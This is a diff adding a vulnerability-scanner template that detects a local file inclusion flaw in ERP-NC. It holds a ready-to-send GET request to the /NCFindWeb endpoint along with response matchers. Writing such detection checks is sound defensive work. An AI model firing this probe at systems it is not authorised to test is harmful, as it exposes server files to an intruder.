@@ -1,0 +1,23 @@
+id: erp-nc-directory-traversal
+name: ERP-NC - Local File Inclusion
+severity: high
+confidence: tentative
+description: ERP-NC is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- lfi
+- erp-nc
+- vuln
+requests:
+- method: GET
+  path: /NCFindWeb?service=IPreAlertConfigService&filename=
+  matchers:
+  - type: body
+    words:
+    - Client
+    - ncwslogin.jsp
+    - admin.jsp
+  - type: status
+    status:
+    - 200
+  condition: and
